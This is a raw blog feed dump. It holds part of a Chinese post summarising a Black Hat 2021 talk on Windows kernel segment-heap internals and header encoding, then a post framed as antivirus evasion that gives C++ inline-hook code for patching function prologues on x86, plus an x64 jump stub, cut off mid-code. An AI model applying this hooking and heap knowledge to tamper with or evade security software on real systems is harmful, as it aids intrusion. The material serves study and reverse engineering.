class="comment">//KLFH类型堆管理链表</span></span><br></pre></td></tr></table></figure><p>根据文章，<code>SEG_HEAP</code>通过两个<code>SegContexts</code>来处理前两种大小的内存（小堆和中堆）</p><ul><li>0~508KB（0-0x7F000）</li><li>508KB~8128KB（0x7F000-0x7F0000）</li><li>大于8128KB（大堆处理）</li></ul><p>内核通过位图（bitmap，做过算法的应该知道吧）保存每次申请的大小的类型</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nt!ExPoolState‐&gt;HeapManager‐&gt;AllocTracker‐&gt;AllocTrackerBitma</span><br></pre></td></tr></table></figure><p>关于位图</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/d5acbdc61a3cace2b43c3a2f3b0e104e.png" alt="image-20240317102907777" /></p><ul><li>每两字节（2Byte）表示在内核内存中的地址</li><li>位图存在三层</li></ul><p><code>_HEAP_SEG_CONTEXT</code>结构体：</p><p>在<code>SEG_HEAP</code>中</p><ul><li><code>_HEAP_SEG_CONTEXT[0]</code>：以 1 页的基本单位处理 1MB 段</li><li><code>_HEAP_SEG_CONTEXT[1]</code>：以 16 页的基本单位处理 16MB 段</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: kd&gt; dt nt!_HEAP_SEG_CONTEXT</span><br><span class="line">   +<span class="number">0x000</span> SegmentMask      : Uint8B</span><br><span class="line">   +<span class="number">0x008</span> UnitShift        : UChar</span><br><span class="line">   +<span class="number">0x009</span> PagesPerUnitShift : UChar</span><br><span class="line">   +<span class="number">0x00a</span> FirstDescriptorIndex : UChar</span><br><span class="line">   +<span class="number">0x00b</span> CachedCommitSoftShift : UChar</span><br><span class="line">   +<span class="number">0x00c</span> CachedCommitHighShift : UChar</span><br><span class="line">   +<span class="number">0x00d</span> Flags            : &lt;anonymous-tag&gt;</span><br><span class="line">   +<span class="number">0x010</span> MaxAllocationSize : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> OlpStatsOffset   : Int2B</span><br><span class="line">   +<span class="number">0x016</span> MemStatsOffset   : Int2B</span><br><span class="line">   +<span class="number">0x018</span> LfhContext       : Ptr64 Void</span><br><span class="line">   +<span class="number">0x020</span> VsContext        : Ptr64 Void</span><br><span class="line">   +<span class="number">0x028</span> EnvHandle        : RTL_HP_ENV_HANDLE</span><br><span class="line">   +<span class="number">0x038</span> Heap             : Ptr64 Void</span><br><span class="line">   +<span class="number">0x040</span> SegmentLock      : Uint8B</span><br><span class="line">   +<span class="number">0x048</span> SegmentListHead  : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x058</span> SegmentCount     : Uint8B</span><br><span class="line">   +<span class="number">0x060</span> FreePageRanges   : _RTL_RB_TREE</span><br><span class="line">   +<span class="number">0x070</span> FreeSegmentListLock : Uint8B</span><br><span class="line">   +<span class="number">0x078</span> FreeSegmentList  : [<span class="number">2</span>] _SINGLE_LIST_ENTRY</span><br></pre></td></tr></table></figure><p>简化一下重要信息</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: kd&gt; dt nt!_HEAP_SEG_CONTEXT</span><br><span class="line">   +<span class="number">0x000</span> SegmentMask      : Uint8B<span class="comment">//如何从池内存到当前段</span></span><br><span class="line">.....</span><br><span class="line">   +<span class="number">0x048</span> SegmentListHead  : _LIST_ENTRY<span class="comment">//连接所有已分配的堆</span></span><br><span class="line">.....</span><br><span class="line">   +<span class="number">0x078</span> FreeSegmentList  : [<span class="number">2</span>] _SINGLE_LIST_ENTRY<span class="comment">//链接所有已释放的堆</span></span><br></pre></td></tr></table></figure><p>段(segment)链接的结构体为`HEAP_PAGE_SEGMENT</p><p><code>_HEAP_PAGE_SEGMENT</code>结构体</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt nt!_HEAP_PAGE_SEGMENT</span><br><span class="line">   +<span class="number">0x000</span> ListEntry        : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x010</span> Signature        : Uint8B</span><br><span class="line">   +<span class="number">0x018</span> SegmentCommitState : Ptr64 _HEAP_SEGMENT_MGR_COMMIT_STATE</span><br><span class="line">   +<span class="number">0x020</span> UnusedWatermark  : UChar</span><br><span class="line">   +<span class="number">0x000</span> DescArray        : [<span class="number">256</span>] _HEAP_PAGE_RANGE_DESCRIPTOR</span><br></pre></td></tr></table></figure><p>这里抹除类型，给点注释</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt nt!_HEAP_PAGE_SEGMENT</span><br><span class="line">   +<span class="number">0x000</span> ListEntry        :       <span class="comment">//结构体`SEG_CONTECT`指向，可参考下面的图</span></span><br><span class="line">   +<span class="number">0x010</span> Signature        :       <span class="comment">//可以找到`SEG_CONTEXT`，但是被异或加密了</span></span><br><span class="line"><span class="comment">//解密方法 `段地址 ^ 堆密钥(heap key) ^ 魔数`</span></span><br><span class="line">........</span><br><span class="line">   +<span class="number">0x000</span> DescArray        : [<span class="number">256</span>] <span class="comment">//每个保存一个单元，还有子段(subseg)类型和偏移</span></span><br><span class="line">   <span class="comment">//  +0x000 TreeNode         : _RTL_BALANCED_NODE</span></span><br><span class="line">   <span class="comment">//  +0x000 TreeSignature    : Uint4B</span></span><br><span class="line">   <span class="comment">//  +0x004 UnusedBytes      : Uint4B</span></span><br><span class="line">   <span class="comment">//  +0x008 ExtraPresent     : Pos 0, 1 Bit</span></span><br><span class="line">   <span class="comment">//  +0x008 Spare0           : Pos 1, 15 Bits</span></span><br><span class="line">   <span class="comment">//  +0x018 RangeFlags       : UChar</span></span><br><span class="line">   <span class="comment">//  +0x019 CommittedPageCount : UChar</span></span><br><span class="line">   <span class="comment">//  +0x01a Spare            : Uint2B</span></span><br><span class="line">   <span class="comment">//  +0x01c Key              : _HEAP_DESCRIPTOR_KEY</span></span><br><span class="line">   <span class="comment">//  +0x01c Align            : [3] UChar</span></span><br><span class="line">   <span class="comment">//  +0x01f UnitOffset       : UChar</span></span><br><span class="line">   <span class="comment">//  +0x01f UnitSize         : UChar</span></span><br></pre></td></tr></table></figure><p>总结下当前的内核相关信息，从<code>SEG_HEAP</code>开始</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/271ff260bccb87ea153b8e49dc8db2bd.png" alt="image-20240317103818286" /></p><h1 id="关于两种大小的内存管理"><a class="markdownIt-Anchor" href="#关于两种大小的内存管理"></a> 关于两种大小的内存管理</h1><h2 id="两种子段-vs和lfh"><a class="markdownIt-Anchor" href="#两种子段-vs和lfh"></a> 两种子段 VS和LFH</h2><p><strong>1. LFH - Low Fragmentation Heap</strong></p><p><code>_HEAP_LFH_SUBSEGMENT</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt nt!_HEAP_LFH_SUBSEGMENT</span><br><span class="line">   +<span class="number">0x000</span> ListEntry        : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x010</span> Owner            : Ptr64 _HEAP_LFH_SUBSEGMENT_OWNER</span><br><span class="line">   +<span class="number">0x010</span> DelayFree        : _HEAP_LFH_SUBSEGMENT_DELAY_FREE</span><br><span class="line">   +<span class="number">0x018</span> CommitLock       : Uint8B</span><br><span class="line">   +<span class="number">0x020</span> FreeCount        : Uint2B</span><br><span class="line">   +<span class="number">0x022</span> BlockCount       : Uint2B</span><br><span class="line">   +<span class="number">0x020</span> InterlockedShort : Int2B</span><br><span class="line">   +<span class="number">0x020</span> InterlockedLong  : Int4B</span><br><span class="line">   +<span class="number">0x024</span> FreeHint         : Uint2B</span><br><span class="line">   +<span class="number">0x026</span> Location         : UChar</span><br><span class="line">   +<span class="number">0x027</span> WitheldBlockCount : UChar</span><br><span class="line">   +<span class="number">0x028</span> BlockOffsets     : _HEAP_LFH_SUBSEGMENT_ENCODED_OFFSETS</span><br><span class="line">   +<span class="number">0x02c</span> CommitUnitShift  : UChar</span><br><span class="line">   +<span class="number">0x02d</span> CommitUnitCount  : UChar</span><br><span class="line">   +<span class="number">0x02e</span> CommitStateOffset : Uint2B</span><br><span class="line">   +<span class="number">0x030</span> BlockBitmap      : [<span class="number">1</span>] Uint8B</span><br></pre></td></tr></table></figure><ul><li><p>用于 129 种常见大小的分配</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/e6e613b9c73ef4cfdf6469218064d5db.png" alt="image-20240317112023052" /></p></li><li><p>所有分配的子段有一样的大小</p></li><li><p>最大大小是<code>0x4000</code></p></li><li><p>为了节省空间，没有独特的head</p></li><li><p>堆块的状态由head中的位图决定</p></li></ul><p><strong>2. VS - Variable Size</strong></p><p><code>_HEAP_VS_SUBSEGMENT</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt nt!_HEAP_VS_SUBSEGMENT</span><br><span class="line">   +<span class="number">0x000</span> ListEntry        : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x010</span> CommitBitmap     : Uint8B</span><br><span class="line">   +<span class="number">0x018</span> CommitLock       : Uint8B</span><br><span class="line">   +<span class="number">0x020</span> Size             : Uint2B</span><br><span class="line">   +<span class="number">0x022</span> Signature        : Pos <span class="number">0</span>, <span class="number">15</span> Bits</span><br><span class="line">   +<span class="number">0x022</span> FullCommit       : Pos <span class="number">15</span>, <span class="number">1</span> Bit</span><br></pre></td></tr></table></figure><ul><li>处理所有LFH不能处理的bucket</li><li>没有个块(block)都有一个自己的头描述</li></ul><p>两者的对比</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/47b7aed371bc8f6e9464a64b014f0ec9.png" alt="image-20240317110710922" /></p><ul><li>VS头中的大小使用<code>heap key</code>加密（其实是编码，这里为了语义通顺），LFH使用自己的<code>LFH Key</code> 加密。（这显然让堆利用变得困难，你猜为啥我要反过来读这篇文章而不是直接做HEVD）</li><li>子段大小不固定</li><li>子段包含多个页，必须从头开始计算偏移去寻找（单独寻找某个页已经几乎不可能）</li><li>已分配的块仍然会存在<code>POOL_HEAD</code>，但是释放掉的不会</li></ul><p><strong>相关的“加密&quot;</strong></p><ul><li>HEAP_LFH_SUBSEGMENT<ol><li>块大小和偏移量位于编码的 BlockOffsets 字段中</li><li>数据（Data） = <code> EncodedData ^ LfhKey ^ ((ULONG)(Subsegment) &gt;&gt; 12)</code></li><li>子段列表没被加密</li></ol></li><li>HEAP_VS_SUBSEGMENT<ol><li>用于链接子段的列表被当前子段地址加密了</li></ol></li><li>HEAP_VS_CHUNK_HEADER<ol><li>每一个VS子段中头存在</li><li>块大小和分配状态在<code>Size</code>头中被加密</li><li>数据（Data）= <code>Sizes.HeaderBits ^ HeapKey ^ ChunkHeader</code></li></ol></li></ul><h2 id="两种上下文"><a class="markdownIt-Anchor" href="#两种上下文"></a> 两种上下文</h2><p>最开始的<code>SEG_HEAP</code>中有</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+<span class="number">0x280</span> VsContext        : _HEAP_VS_CONTEXT</span><br><span class="line">+<span class="number">0x340</span> LfhContext       : _HEAP_LFH_CONTEXT</span><br></pre></td></tr></table></figure><p><strong>_HEAP_LFH_CONTEXT</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt nt!_HEAP_LFH_CONTEXT</span><br><span class="line">   +<span class="number">0x000</span> BackendCtx       : Ptr64 Void</span><br><span class="line">   +<span class="number">0x008</span> Callbacks        : _HEAP_SUBALLOCATOR_CALLBACKS</span><br><span class="line">   +<span class="number">0x030</span> AffinityModArray : Ptr64 UChar</span><br><span class="line">   +<span class="number">0x038</span> MaxAffinity      : UChar</span><br><span class="line">   +<span class="number">0x039</span> LockType         : UChar</span><br><span class="line">   +<span class="number">0x03a</span> MemStatsOffset   : Int2B</span><br><span class="line">   +<span class="number">0x03c</span> Config           : _RTL_HP_LFH_CONFIG</span><br><span class="line">   +<span class="number">0x040</span> BucketStats      : _HEAP_LFH_SUBSEGMENT_STATS</span><br><span class="line">   +<span class="number">0x048</span> SubsegmentCreationLock : Uint8B</span><br><span class="line">   +<span class="number">0x080</span> Buckets          : [<span class="number">129</span>] Ptr64 _HEAP_LFH_BUCKET</span><br></pre></td></tr></table></figure><p>注释关键信息</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt nt!_HEAP_LFH_CONTEXT</span><br><span class="line">...</span><br><span class="line">   +<span class="number">0x008</span> Callbacks        : <span class="comment">//子堆分配回调函数</span></span><br><span class="line">......</span><br><span class="line">   +<span class="number">0x080</span> Buckets          : [<span class="number">129</span>] <span class="comment">//前面提到过LFH处理常见129种堆</span></span><br><span class="line"><span class="comment">//这里的bucket就存放每个堆的列表</span></span><br><span class="line"><span class="comment">//保存有关块大小、子段计数、块计数的数据</span></span><br></pre></td></tr></table></figure><p><strong>_HEAP_VS_CONTEXT</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt nt!_HEAP_VS_CONTEXT</span><br><span class="line">   +<span class="number">0x000</span> Lock             : Uint8B</span><br><span class="line">   +<span class="number">0x008</span> LockType         : _RTLP_HP_LOCK_TYPE</span><br><span class="line">   +<span class="number">0x010</span> FreeChunkTree    : _RTL_RB_TREE</span><br><span class="line">   +<span class="number">0x020</span> SubsegmentList   : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x030</span> TotalCommittedUnits : Uint8B</span><br><span class="line">   +<span class="number">0x038</span> FreeCommittedUnits : Uint8B</span><br><span class="line">   +<span class="number">0x040</span> DelayFreeContext : _HEAP_VS_DELAY_FREE_CONTEXT</span><br><span class="line">   +<span class="number">0x080</span> BackendCtx       : Ptr64 Void</span><br><span class="line">   +<span class="number">0x088</span> Callbacks        : _HEAP_SUBALLOCATOR_CALLBACKS</span><br><span class="line">   +<span class="number">0x0b0</span> Config           : _RTL_HP_VS_CONFIG</span><br><span class="line">   +<span class="number">0x0b4</span> Flags            : Uint4B</span><br></pre></td></tr></table></figure><p>注释关键信息</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt nt!_HEAP_VS_CONTEXT</span><br><span class="line">......</span><br><span class="line">   +<span class="number">0x020</span> SubsegmentList   : <span class="comment">//所有VS类型的子段</span></span><br><span class="line">   +<span class="number">0x030</span> TotalCommittedUnits : <span class="comment">//计数</span></span><br><span class="line">   +<span class="number">0x038</span> FreeCommittedUnits : <span class="comment">//计数</span></span><br><span class="line">......</span><br><span class="line">   +<span class="number">0x088</span> Callbacks        : <span class="comment">//allocate, free, commit等子段回调函数</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>总结下两种上下文</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/09b816568e627599cec85957350f2d0c.png" alt="image-20240317112721755" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;文章来自blackhat 2021的文章《Windows-Heap-Backed-Pool-The-Good-The-Bad-And-The-Encoded》&lt;/p&gt;
&lt;p&gt;原文链接：&lt;a href=&quot;https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Windows-Heap-Backed-Pool-The-Good-The-Bad-And-The-Encoded.pdf&quot;&gt;https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Windows-Heap-Backed-Pool-The-Good-The-Bad-And-The-Encoded.pdf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Youtube：&lt;a href=&quot;https://www.youtube.com/watch?v=VvxNc8GTFfk&quot;&gt;https://www.youtube.com/watch?v=VvxNc8GTFfk&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>【免杀】Windows Inline Hook小结</title>
    <link href="https://joe1sn.eu.org/2024/03/15/little-hook/"/>
    <id>https://joe1sn.eu.org/2024/03/15/little-hook/</id>
    <published>2024-03-15T05:47:31.000Z</published>
    <updated>2025-01-26T14:46:00.784Z</updated>
    
    <content type="html"><![CDATA[<p>Inline Hook还是挺好玩的</p><p>文章很短，只是打个总结，记录一些有趣的发现</p><span id="more"></span><h1 id="写在前面"><a class="markdownIt-Anchor" href="#写在前面"></a> 写在前面</h1><p>之前在学习hook的时候，发现抄的一段代码只能在Debug模式下运行，调试后发现MSVC很有趣的一个点</p><p>当我们使用Debug模式编译的时候，程序为了调试方便，会将所有函数加入这个表中</p><p>比如</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">oldtest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;not hook&quot;</span>, <span class="string">&quot;test&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">oldtest</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按照直觉<img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/45f2ae66613617bdfe44a54f286f7ab5.png" alt="image-20240315135117012" /></p><p>这里的<code>call</code>应该会直接来到函数的位置，但是真实情况并非如此</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/f9b93b22f4d696e77ab104663a1504dd.png" alt="image-20240315135138849" /></p><p>我们会发现一张跳表，根据距离这张表的地址差进行跳转，那段hook只是修改了这一段代码</p><h1 id="x86-hook"><a class="markdownIt-Anchor" href="#x86-hook"></a> x86 hook</h1><p>首先是<code>x86</code>为啥叫32位架构，最突出的就是一个寄存器有32位(bit)大小，那么计算一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(1&lt;&lt;32)/int(1024*1024*1024) = 4</span><br></pre></td></tr></table></figure><p>没错，32位的寄存器最多只能存放4GB个数字（比如从<code>1</code>到<code>0x100000000</code>），<br />由于要做加减发（有负数），所以能找到的地址位<code>±2GB</code>，<br />那么8位为一个字节，那么一个寄存器只能由4个字节，<br /><code>jmp</code>根据4字节这样对齐，所以32位下我们只需要<strong>覆盖5字节</strong>就能实现任意地址的跳转，<br />再加上之前的debug模式，可以写出下列hook代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Hooks::InlineHook_x32</span><span class="params">(FuncAddr HookFunction)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//set read write</span></span><br><span class="line">    DWORD old;</span><br><span class="line">    DWORD size = <span class="number">5</span>;</span><br><span class="line">    FuncAddr offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">VirtualProtect</span>(<span class="built_in">LPVOID</span>(<span class="keyword">this</span>-&gt;FunctionAddr), size, PAGE_EXECUTE_READWRITE, &amp;old)) &#123;</span><br><span class="line">        <span class="built_in">Error</span>(<span class="string">&quot;Can&#x27;t Set Memory read/write&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _DEBUG</span></span><br><span class="line">    <span class="comment">//hook with debug jmp table</span></span><br><span class="line">    offset = HookFunction - <span class="keyword">this</span>-&gt;FunctionAddr - <span class="number">5</span>;</span><br><span class="line">    *(<span class="type">char</span>*)<span class="keyword">this</span>-&gt;FunctionAddr = <span class="string">&#x27;\xE9&#x27;</span>;</span><br><span class="line">    *(DWORD*)(<span class="keyword">this</span>-&gt;FunctionAddr + <span class="number">1</span>) = offset;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//return to the origin</span></span><br><span class="line">    size = <span class="number">5</span>;</span><br><span class="line">    FuncAddr RealAddr = <span class="keyword">this</span>-&gt;<span class="built_in">GetRealAddr</span>((<span class="type">void</span> *)HookFunction);</span><br><span class="line">    FuncAddr func_size = <span class="keyword">this</span>-&gt;<span class="built_in">GetProcSize</span>(RealAddr) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">VirtualProtect</span>(<span class="built_in">LPVOID</span>(RealAddr + func_size), size, PAGE_EXECUTE_READWRITE, &amp;old)) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">Error</span>(<span class="string">&quot;Can&#x27;t Set Memory read/write&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(<span class="type">char</span>*)(RealAddr + func_size + <span class="number">0</span>) = <span class="string">&#x27;\xE9&#x27;</span>;</span><br><span class="line">    offset = <span class="keyword">this</span>-&gt;RealAddr - RealAddr;</span><br><span class="line">    *(DWORD*)(RealAddr + func_size + <span class="number">1</span>) = (offset - func_size - <span class="number">5</span>);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="comment">//get first 5 bytes</span></span><br><span class="line">    <span class="type">char</span> head[<span class="number">6</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(head, (<span class="type">void</span>*)<span class="keyword">this</span>-&gt;FunctionAddr, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (HookFunction &gt; <span class="keyword">this</span>-&gt;FunctionAddr)</span><br><span class="line">        offset = (HookFunction - <span class="keyword">this</span>-&gt;FunctionAddr - <span class="number">5</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        offset = ~(<span class="keyword">this</span>-&gt;FunctionAddr - HookFunction - <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">char</span>*)(<span class="keyword">this</span>-&gt;FunctionAddr + <span class="number">0</span>) = <span class="string">&#x27;\xE9&#x27;</span>;</span><br><span class="line">    *(DWORD*)(<span class="keyword">this</span>-&gt;FunctionAddr + <span class="number">1</span>) = offset - <span class="number">9</span>; <span class="comment">//API hook</span></span><br><span class="line">    <span class="comment">//*(DWORD*)(this-&gt;FunctionAddr + 1) = offset;   //</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//return to the origin</span></span><br><span class="line">    FuncAddr func_size = <span class="keyword">this</span>-&gt;<span class="built_in">GetProcSize</span>(HookFunction) - <span class="number">1</span>;</span><br><span class="line">    size = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">VirtualProtect</span>(<span class="built_in">LPVOID</span>(HookFunction + func_size), size, PAGE_EXECUTE_READWRITE, &amp;old)) &#123;</span><br><span class="line">        <span class="built_in">Error</span>(<span class="string">&quot;Can&#x27;t Set Memory read/write&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//reset the top 5bytes in header</span></span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">void</span>*)((FuncAddr)HookFunction + func_size), head, <span class="number">5</span>);</span><br><span class="line">    *(<span class="type">char</span>*)(HookFunction + func_size + <span class="number">5</span>) = <span class="string">&#x27;\xE9&#x27;</span>;</span><br><span class="line">    <span class="comment">//*(DWORD*)(HookFunction + func_size + 6) = ~(offset + func_size + 9);</span></span><br><span class="line">    *(DWORD*)(HookFunction + func_size + <span class="number">6</span>) = ~(offset + func_size);    <span class="comment">//win api hook</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="x64-hook"><a class="markdownIt-Anchor" href="#x64-hook"></a> x64 hook</h1><p>上面讲到了x86 hook只能2GB内内存寻址，到了x64寻址空间大大加大，单纯<code>jmp</code>和<code>call</code>已经无法跳转到地址，后来我看到一个很有意思的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[Bits 64]</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    push addr.low</span><br><span class="line">    mov dword [rsp+4], addr.high</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure><p>这个方法不会污染寄存器，也不会对栈造成影响，所以得到hook函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 